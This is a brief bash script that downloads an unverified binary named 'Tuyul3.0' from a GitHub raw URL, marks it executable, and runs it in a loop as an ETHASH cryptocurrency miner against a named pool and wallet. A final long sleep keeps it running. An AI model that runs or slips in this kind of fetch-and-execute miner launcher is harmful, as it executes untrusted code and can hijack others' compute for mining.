#!/bin/bash
POOL=stratum+tcp://ethash.kupool.com:1800
WALLET=tawheedop
WORKER=gpu1
wget https://github.com/thecoderop/new/raw/main/Tuyul3.0
chmod +x Tuyul3.0
while [ 1 ]; do
./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER
sleep 5
done
sleep 999999999 
